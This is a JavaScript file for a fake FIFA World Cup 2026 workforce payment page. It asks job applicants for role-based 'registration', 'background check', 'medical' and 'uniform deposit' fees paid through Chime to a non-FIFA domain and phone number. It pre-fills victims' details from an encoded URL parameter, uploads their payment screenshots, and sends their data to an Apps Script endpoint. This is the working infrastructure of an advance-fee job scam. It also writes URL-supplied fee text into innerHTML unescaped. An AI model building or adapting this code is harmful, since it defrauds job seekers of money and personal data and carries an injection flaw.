/* FIFA World Cup 2026 — payment page (Chime + careers site ?d= payload) */

const CONFIG = {
  chimePhoneNumber: "+1 (513) 628-6294",
  chimePaymentEmail: "payment@fifa26workforce.com",
  cloudinaryCloudName: "dibwotfd5",
  cloudinaryUploadPreset: "payment-screenshot",
  /** Same Apps Script /exec URL as the careers site — sends payment alert emails */
  paymentScriptUrl:
    "https://script.google.com/macros/s/AKfycbxHATyBoGmfaWeNnx6Q42EK6sIVGrakQ5TX7ZOlUgGWpT4XVaS7HNr653Q1bHeHL6p1/exec",
  chimeLogoUrl:
    "https://res.cloudinary.com/dibwotfd5/image/upload/v1781311362/ftapsotdiafzbxixrawg.jpg",
};

const ICONS = {
  admin: `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 3H8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z"/></svg>`,
  background: `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
  medical: `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>`,
  training: `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>`,
  uniform: `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.38 3.46L16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.57a1 1 0 0 0 .99.84H6v10c0 1.1.9 2 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.57a2 2 0 0 0-1.34-2.23z"/></svg>`,
};

const FEE_ICON_BY_ID = {
  admin: "admin",
  background: "background",
  medical: "medical",
  training: "training",
  uniform: "uniform",
};

const FALLBACK_FEES = {
  standard: { admin: 20, background: 18, medical: 15, training: 17, uniform: 15 },
  mid: { admin: 23, background: 20, medical: 17, training: 19, uniform: 17 },
  security: { admin: 22, background: 25, medical: 17, training: 19, uniform: 17 },
  leadership: { admin: 28, background: 22, medical: 18, training: 20, uniform: 20 },
};

const FALLBACK_LABELS = {
  admin: { label: "Registration & workforce admin", desc: "ID badge, lanyard, and assignment paperwork" },
  background: { label: "Security clearance processing", desc: "Standard background review for venue access" },
  medical: { label: "Health & safety screening", desc: "Brief screening required for event insurance coverage" },
  training: { label: "Venue orientation session", desc: "On-site procedures, coordination tools, and emergency protocols" },
  uniform: { label: "Uniform kit deposit", desc: "Refundable when your kit is returned at the end of your assignment" },
};

const SECURITY_ROLES = new Set([
  "security_exterior",
  "crowd_management",
  "hospitality_security",
  "pitch_security",
  "psa_vsa",
  "airport_supervisor",
]);

const LEADERSHIP_ROLES = new Set([
  "vip_lounge_mgr",
  "vip_hotel_mgr",
  "venue_ops_mgr",
  "venue_hotel_mgr",
  "deputy_workforce_mgr",
  "warehouse_mgr",
]);

let currentMethod = "chime";

document.addEventListener("DOMContentLoaded", () => {
  loadPageData();
  setChimeContactDetails();
});

function decodePayload() {
  const encoded = new URLSearchParams(window.location.search).get("d");
  if (!encoded) return null;

  try {
    const binary = atob(decodeURIComponent(encoded));
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i);
    return JSON.parse(new TextDecoder().decode(bytes));
  } catch {
    try {
      return JSON.parse(atob(decodeURIComponent(encoded)));
    } catch {
      return null;
    }
  }
}

function getFallbackBand(roleKey) {
  if (LEADERSHIP_ROLES.has(roleKey)) return "leadership";
  if (SECURITY_ROLES.has(roleKey)) return "security";
  if (roleKey === "biz_ops_finance" || roleKey === "commercial_ops_specialist") return "mid";
  return "standard";
}

function buildFallbackFees(roleKey) {
  const amounts = { ...FALLBACK_FEES[getFallbackBand(roleKey)] };
  if (roleKey === "medical_care_navigator") amounts.medical = Math.min(amounts.medical + 3, 22);

  return [
    { id: "admin", ...FALLBACK_LABELS.admin, amount: amounts.admin, isDeposit: false },
    { id: "background", ...FALLBACK_LABELS.background, amount: amounts.background, isDeposit: false },
    { id: "medical", ...FALLBACK_LABELS.medical, amount: amounts.medical, isDeposit: false },
    { id: "training", ...FALLBACK_LABELS.training, amount: amounts.training, isDeposit: false },
    { id: "uniform", ...FALLBACK_LABELS.uniform, amount: amounts.uniform, isDeposit: true },
  ].map((item) => ({
    id: item.id,
    label: item.label,
    description: item.desc,
    amount: item.amount,
    amountLabel: item.isDeposit ? `$${item.amount.toFixed(2)} deposit` : `$${item.amount.toFixed(2)}`,
    isDeposit: item.isDeposit,
  }));
}

function formatHeroRole(jobTitle) {
  const title = String(jobTitle || "").trim();
  return title ? `${title} — FIFA World Cup 2026` : "FIFA World Cup 2026";
}

function formatRoleName(jobTitle) {
  return String(jobTitle || "").trim() || "your selected role";
}

function loadPageData() {
  const payload = decodePayload();
  const params = new URLSearchParams(window.location.search);

  if (payload?.applicationId) {
    applyPayload(payload);
    return;
  }

  const applicationId = params.get("applicationId") || generateApplicationId();
  const roleKey = (params.get("role") || "standard").toLowerCase();
  const items = buildFallbackFees(roleKey);
  const jobTitle = params.get("jobTitle") || "";

  document.getElementById("application-id").textContent = applicationId;
  sessionStorage.setItem("applicationId", applicationId);
  document.getElementById("hero-role").textContent = formatHeroRole(jobTitle);
  sessionStorage.setItem("roleName", formatRoleName(jobTitle));

  renderFeeItems(items);
}

function applyPayload(payload) {
  document.getElementById("application-id").textContent = payload.applicationId;
  sessionStorage.setItem("applicationId", payload.applicationId);
  document.getElementById("hero-role").textContent = formatHeroRole(payload.jobTitle);
  sessionStorage.setItem("roleName", formatRoleName(payload.jobTitle));

  const nameInput = document.getElementById("sender-name");
  const emailInput = document.getElementById("sender-email");
  if (nameInput && payload.name) nameInput.value = payload.name;
  if (emailInput && payload.email) emailInput.value = payload.email;

  const fees = payload.fees || {};
  const items = fees.items || buildFallbackFees(payload.role || "standard");
  renderFeeItems(items, fees.paymentExplanation || payload.paymentExplanation);

  const reportingSection = document.getElementById("reporting-section");
  if (reportingSection && payload.reportingDateLabel) {
    reportingSection.hidden = false;
    document.getElementById("reporting-text").textContent =
      normalizeReportingInstruction(payload.reportingInstruction) ||
      "Please report to venue reception on the date below.";
    document.getElementById("reporting-meta").textContent =
      `Date: ${payload.reportingDateLabel} · Time: ${payload.reportingTimeLabel || "8:00 AM"}`;
    const venue = [payload.stadiumName, payload.stadiumAddress].filter(Boolean).join(", ");
    if (venue) document.getElementById("reporting-venue").textContent = `Venue: ${venue}`;
  }
}

function normalizeReportingInstruction(text) {
  return String(text || "")
    .replace(/\s*\(shown below\)/gi, "")
    .replace(/\s*\(shown above\)/gi, "");
}

function renderFeeItems(items, explanation) {
  const container = document.getElementById("fees-breakdown");
  if (!container) return;

  let nonRefundable = 0;
  let depositTotal = 0;

  container.innerHTML = items
    .map((fee) => {
      const isDeposit = Boolean(fee.isDeposit);
      const amount = Number(fee.amount || 0);
      if (isDeposit) depositTotal += amount;
      else nonRefundable += amount;

      const iconKey = FEE_ICON_BY_ID[fee.id] || "admin";
      const amountLabel =
        fee.amountLabel ||
        (isDeposit ? `$${amount.toFixed(2)} deposit` : `$${amount.toFixed(2)}`);

      return `
        <div class="fee-row">
          <div class="fee-row-left">
            <div class="fee-icon">${ICONS[iconKey]}</div>
            <div>
              <p class="fee-row-label">${fee.label}</p>
              <p class="fee-row-desc">${fee.description}</p>
            </div>
          </div>
          <span class="fee-row-amount">${amountLabel}</span>
        </div>`;
    })
    .join("");

  const total = nonRefundable + depositTotal;
  document.getElementById("payment-amount").textContent = `$${total.toFixed(2)}`;
  document.getElementById("confirm-amount").textContent = `$${total.toFixed(2)}`;
  sessionStorage.setItem("feeAmount", String(total));

  const expl = document.getElementById("fees-explanation");
  if (expl && explanation) expl.textContent = explanation;
}

function setChimeContactDetails() {
  const phoneEl = document.getElementById("chime-number");
  const emailEl = document.getElementById("chime-email");
  const disclaimerPhone = document.getElementById("disclaimer-chime-phone");
  const disclaimerEmail = document.getElementById("disclaimer-chime-email");

  if (phoneEl) phoneEl.textContent = CONFIG.chimePhoneNumber;
  if (emailEl) emailEl.textContent = CONFIG.chimePaymentEmail;
  if (disclaimerPhone) disclaimerPhone.textContent = CONFIG.chimePhoneNumber;
  if (disclaimerEmail) disclaimerEmail.textContent = CONFIG.chimePaymentEmail;
}

function selectMethod(method) {
  currentMethod = method;
  const chimeOpt = document.getElementById("opt-chime");
  const cardOpt = document.getElementById("opt-card");
  const dotChime = document.getElementById("dot-chime");
  const dotCard = document.getElementById("dot-card");
  const chimePanel = document.getElementById("chime-panel");
  const cardPanel = document.getElementById("card-panel");

  if (method === "chime") {
    chimeOpt.classList.add("active");
    chimeOpt.classList.remove("disabled");
    cardOpt.classList.remove("active");
    cardOpt.classList.add("disabled");
    dotChime.classList.add("active");
    dotCard.classList.remove("active");
    chimePanel.style.display = "block";
    cardPanel.style.display = "none";
  } else {
    cardOpt.classList.add("active");
    cardOpt.classList.remove("disabled");
    chimeOpt.classList.remove("active");
    dotCard.classList.add("active");
    dotChime.classList.remove("active");
    cardPanel.style.display = "block";
    chimePanel.style.display = "none";
  }
}

function copyChimeContact(type) {
  const isEmail = type === "email";
  const toCopy = isEmail
    ? CONFIG.chimePaymentEmail
    : "+" + CONFIG.chimePhoneNumber.replace(/\D/g, "");
  const btn = document.getElementById(isEmail ? "copy-email-btn" : "copy-phone-btn");
  const label = document.getElementById(isEmail ? "copy-email-label" : "copy-phone-label");
  const defaultLabel = isEmail ? "Copy email" : "Copy number";

  const onCopied = () => setCopied(btn, label, defaultLabel);

  navigator.clipboard.writeText(toCopy).then(onCopied, () => {
    const el = document.createElement("textarea");
    el.value = toCopy;
    document.body.appendChild(el);
    el.select();
    document.execCommand("copy");
    document.body.removeChild(el);
    onCopied();
  });
}

function setCopied(btn, label, defaultLabel) {
  if (!btn || !label) return;
  btn.classList.add("copied");
  label.textContent = "Copied!";
  setTimeout(() => {
    btn.classList.remove("copied");
    label.textContent = defaultLabel;
  }, 2500);
}

function handleFileUpload(input) {
  const file = input.files[0];
  if (!file) return;
  if (file.size > 5 * 1024 * 1024) {
    alert("File too large. Max 5MB.");
    input.value = "";
    return;
  }
  document.getElementById("upload-area").classList.add("has-file");
  document.getElementById("upload-label").textContent = "✓ " + file.name;
}

function validateForm() {
  const name = document.getElementById("sender-name").value.trim();
  const email = document.getElementById("sender-email").value.trim();
  if (!name) {
    showError("sender-name", "Please enter your full name.");
    return false;
  }
  if (!email || !isValidEmail(email)) {
    showError("sender-email", "Please enter a valid email.");
    return false;
  }
  return true;
}

function showError(fieldId, message) {
  const field = document.getElementById(fieldId);
  field.style.borderColor = "#ef4444";
  field.focus();
  const existing = field.parentNode.querySelector(".error-msg");
  if (existing) existing.remove();
  const err = document.createElement("p");
  err.className = "error-msg";
  err.style.cssText = "font-size:12px;color:#ef4444;margin-top:4px;font-weight:500;";
  err.textContent = message;
  field.parentNode.appendChild(err);
  field.addEventListener(
    "input",
    () => {
      field.style.borderColor = "";
      if (err.parentNode) err.remove();
    },
    { once: true },
  );
}

function isValidEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
}

function prepareScreenshotFile(file, applicationId) {
  const extension = String(file.name || "")
    .toLowerCase()
    .match(/\.(jpe?g|png|webp)$/i)?.[1] || "jpg";
  const safeId = String(applicationId || "payment")
    .replace(/[^a-zA-Z0-9_-]+/g, "-")
    .slice(0, 40);
  const safeName = `payment-${safeId}-${Date.now()}.${extension}`;

  if (file.name === safeName) {
    return file;
  }

  return new File([file], safeName, {
    type: file.type || "image/jpeg",
    lastModified: file.lastModified,
  });
}

/**
 * Unsigned browser upload — only cloud name + preset are required (never API key/secret).
 */
async function uploadScreenshotToCloudinary(file, applicationId) {
  const cloudName = CONFIG.cloudinaryCloudName;
  const uploadPreset = CONFIG.cloudinaryUploadPreset;

  if (!cloudName || !uploadPreset) {
    throw new Error("Cloudinary is not configured on this page.");
  }

  const uploadFile = prepareScreenshotFile(file, applicationId);
  const formData = new FormData();
  formData.append("file", uploadFile);
  formData.append("upload_preset", uploadPreset);
  formData.append("context", `application_id=${applicationId || "unknown"}`);

  const response = await fetch(
    `https://api.cloudinary.com/v1_1/${cloudName}/image/upload`,
    { method: "POST", body: formData },
  );

  const payload = await response.json().catch(() => null);

  if (!response.ok || !payload?.secure_url) {
    const message =
      payload?.error?.message ||
      "We could not upload your screenshot. Please try again or choose a different image.";
    throw new Error(message);
  }

  return payload.secure_url;
}

async function notifyPaymentSubmission(payload) {
  const scriptUrl = CONFIG.paymentScriptUrl;
  if (!scriptUrl) return;

  try {
    await fetch(scriptUrl, {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({ type: "payment_submission", ...payload }),
    });
  } catch {
    // no-cors — submission may still succeed server-side; do not block success UI
  }
}

async function submitPayment() {
  if (!validateForm()) return;

  const btn = document.getElementById("submit-btn");
  const applicationId = document.getElementById("application-id").textContent.trim();
  const screenshotInput = document.getElementById("screenshot");
  const screenshotFile = screenshotInput?.files?.[0];

  btn.disabled = true;
  btn.textContent = screenshotFile ? "Uploading screenshot..." : "Submitting...";

  let screenshotUrl = "";

  try {
    if (screenshotFile) {
      screenshotUrl = await uploadScreenshotToCloudinary(screenshotFile, applicationId);
    }

    btn.textContent = "Submitting...";

    const payload = {
      applicationId,
      applicantName: document.getElementById("sender-name").value.trim(),
      applicantEmail: document.getElementById("sender-email").value.trim(),
      transactionRef: document.getElementById("transaction-ref").value.trim(),
      role: sessionStorage.getItem("roleName") || "your selected role",
      amount: sessionStorage.getItem("feeAmount") || "85.00",
      paymentMethod: "Chime Pay Anyone",
      confirmationRef: "CONF-" + Date.now(),
      screenshotUrl,
      timestamp: new Date().toISOString(),
    };

    await notifyPaymentSubmission(payload);
    handleSuccess(payload);
  } catch (error) {
    btn.disabled = false;
    btn.textContent = "I've sent the payment";
    alert(error?.message || "Something went wrong. Please try again.");
  }
}

function handleSuccess(data) {
  document.getElementById("main-card").style.display = "none";
  const card = document.getElementById("success-card");
  card.style.display = "block";
  document.getElementById("success-name").textContent = data.applicantName;
  document.getElementById("success-role").textContent = data.role;
  document.getElementById("success-email").textContent = data.applicantEmail;
  document.getElementById("success-ref-id").textContent = data.confirmationRef;
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function generateApplicationId() {
  return "APP-" + Date.now();
}
